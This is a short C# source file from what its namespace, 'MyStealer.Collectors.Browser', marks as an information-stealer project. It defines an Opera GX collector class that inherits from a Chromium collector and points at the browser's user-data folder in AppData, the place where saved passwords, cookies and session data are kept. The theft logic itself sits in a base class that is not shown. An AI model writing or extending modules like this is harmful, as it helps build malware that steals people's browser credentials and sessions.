using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    public class OperaGX : Chromium
    {
        public override string ModuleName => "Opera GX";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera GX Stable");
    }
}
